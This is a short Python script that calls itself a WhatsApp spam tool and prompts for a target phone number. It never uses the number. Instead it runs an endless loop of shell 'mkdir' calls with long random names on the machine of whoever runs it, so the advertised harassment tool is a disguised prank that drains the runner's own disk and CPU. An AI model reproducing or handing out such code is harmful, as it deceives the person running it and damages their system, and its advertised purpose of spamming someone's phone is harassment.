import os
import random

def clear():
	os.system('clear')

ro = '\033[1;35m'
cl = '\033[0m'

clear()

print(f'''   ━━━━━━━━❮◆❯━━━━━━━━
        {ro}SPAM WHATSAPP{cl}
   ━━━━━━━━❮◆❯━━━━━━━━

by: {ro}Swag666baby{cl}


NUMERO DO ALVO
 ''')
input('>>>')
	
	
def bombdir(Length):
    numeros = '0123456789'
    letras = 'abcdefghijklmnopqrstuvwxyz'
    cs = '-,_.'
    ran = ''
    for i in range(0,Length,2):
        ran += random.choice(numeros)
        ran += random.choice(letras)
        ran += random.choice(cs)
    return ran
	
clear()

while True:
	os.system(f'mkdir {bombdir(10*100)}')
